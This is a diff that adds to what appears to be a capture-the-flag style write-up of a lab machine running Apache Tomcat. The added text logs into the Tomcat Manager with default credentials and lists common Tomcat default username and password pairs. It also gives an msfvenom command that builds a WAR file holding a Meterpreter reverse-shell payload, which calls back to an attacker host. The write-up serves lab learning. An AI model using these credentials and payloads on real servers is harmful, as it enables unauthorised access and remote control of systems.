@@ -40,6 +40,57 @@ Nikto
 * Discovered Apache Tomcat and JSP vulnerability 
 
 ## Navigate to 10.10.10.95:8080
+![8080.jpg]({{site.baseurl}}/_posts/8080.jpg)
+
+access: http://10.10.10.95:8080/manager/html "Manager App" 
+
+Username: tomcat
+Password: s3cret
+
+```
+list of Apache Default Credentials 
+Username Password
+admin 	password
+admin 	
+admin 	Password1
+admin 	password1
+admin 	admin
+admin 	tomcat
+both 	tomcat
+manager manager
+role1 	role1
+role1 	tomcat
+role 	changethis
+root 	Password1
+root 	changethis
+root 	password
+root 	password1
+root 	r00t
+root 	root
+root 	toor
+tomcat 	tomcat
+tomcat 	s3cret
+tomcat 	password1
+tomcat 	password
+tomcat 	
+tomcat 	admin
+tomcat 	changethis
+```
+source: "https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown"
+
+
+## Attack Vector
+utilizing a specialied WAR file we can upload to the server and access a .jsp that will allow access to the system
+
+![war.jpg]({{site.baseurl}}/_posts/war.jpg)
+
+Crafting WAR file:
+tools: msfvenom
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.13.75 LPORT=9002 -f war -o war.war
+```
+
+
 
 
 
